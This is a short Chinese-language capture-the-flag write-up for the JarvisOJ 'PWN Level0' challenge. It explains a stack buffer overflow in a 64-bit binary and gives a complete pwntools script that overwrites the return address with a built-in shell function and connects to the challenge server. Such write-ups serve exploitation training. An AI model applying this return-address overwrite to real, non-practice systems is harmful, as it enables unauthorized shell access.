# JarvisOJ-PWN-Level0

## 0x01 文件查看

```shell
file level0
```

![](README/BEEDD31A-3E25-4E4F-8608-9618CE4CCC23.png)
检查之后发现文件是64位的elf程序

```shell
checksec level0
```


![](README/EA63714E-03BB-47D1-B5C1-E10D69218681.png)

开了NX保护，可以防止栈上的数据运行，不过该题不需要运行栈上的shellcode，因为程序自带了shell函数
 
把程序仍到ida里面，按F5查看

![](README/66558C5F-546B-4A66-8204-4FD44D203818.png)
查看vulnerable_function函数
![](README/59F4897E-794F-4632-9F63-F2220CE5447B.png)

程序定义了0x80长度的buf，但是read读取了0x200的长度，典型的缓冲区溢出

除此之外还有一个calllsystem函数，是程序自带的shell
![](README/56806678-FFF7-41D6-ABFD-B28802B7AD73.png)

这样的利用原理就是将通过溢出的信息将ret的地址复写成callsystem的地址
![](README/B6CE8DD4-90E5-437C-9F15-AE53F7DE7712.png)

callsystem的地址是0000000000400596

payload的构造,因为是64位程序，所以ebp的长度是0x8
```python
callsystem_addr = 0x0000000000400596 
payload = "A"*(0x80+0x8)+p64(callsystem_addr)
```

最终程序就是
```
from pwn import *

conn = remote("pwn2.jarvisoj.com", 9881)

callsystem_addr = 0x0000000000400596

payload = "A"*(0x80+0x8)+p64(callsystem_addr)

conn.send(payload)

conn.interactive()
```


![](README/9C2FF4F8-93CE-4921-8897-3E0AC11B675D.png)